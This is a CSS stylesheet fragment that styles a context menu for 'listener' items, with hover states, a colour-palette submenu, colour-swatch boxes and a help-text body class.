.cs-listener-ctx-menu {
  position: fixed;
  background: var(--cs-panel);
  border: 1px solid var(--cs-card-border);
  box-shadow: 0 6px 16px rgba(0, 0, 0, 0.12), 0 3px 6px -4px rgba(0, 0, 0, 0.12);
  border-radius: 8px;
  padding: 4px 0;
  z-index: 9999;
  min-width: 180px;
}

.cs-listener-ctx-menu .ctx-item {
  position: relative;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 8px 14px;
  font-size: 13px;
  color: var(--cs-text);
  cursor: pointer;
}

.cs-listener-ctx-menu .ctx-item:hover {
  background: var(--cs-hover);
  color: var(--cs-text-bright);
}

.cs-listener-ctx-menu .ctx-arrow {
  font-size: 12px;
  color: var(--cs-text-dim);
  margin-left: 14px;
}

.cs-listener-ctx-menu .ctx-color-palette {
  position: absolute;
  top: -2px;
  left: 100%;
  background: var(--cs-panel);
  border: 1px solid var(--cs-card-border);
  box-shadow: 0 6px 16px rgba(0, 0, 0, 0.12), 0 3px 6px -4px rgba(0, 0, 0, 0.12);
  border-radius: 8px;
  padding: 6px;
  display: flex;
  gap: 6px;
  z-index: 10000;
}

.color-box {
  width: 24px;
  height: 24px;
  border: 1px solid var(--cs-border-strong);
  border-radius: 4px;
  cursor: pointer;
}

.color-box:hover {
  border-color: var(--cs-active);
}

.pv-help-body {
  line-height: 1.8;
  font-size: 13px;
  color: var(--cs-text);
}
</style>